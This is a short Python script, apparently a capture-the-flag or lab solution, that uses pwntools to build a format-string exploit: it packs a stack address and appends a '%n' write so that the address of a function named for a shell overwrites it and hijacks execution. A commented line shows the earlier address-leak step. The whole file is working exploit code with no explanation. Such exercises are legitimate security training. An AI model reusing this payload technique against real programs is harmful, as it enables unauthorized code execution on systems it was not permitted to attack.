#!/usr/bin/env python

from pwn import *

addr = 0xffffce2c
shellAddr = 0x080484cb

output = ""

output += p32(addr)

output += "%" + str(shellAddr - 4) +"x%5$n"

#output = p32(addr) + "...%5$x"

print output
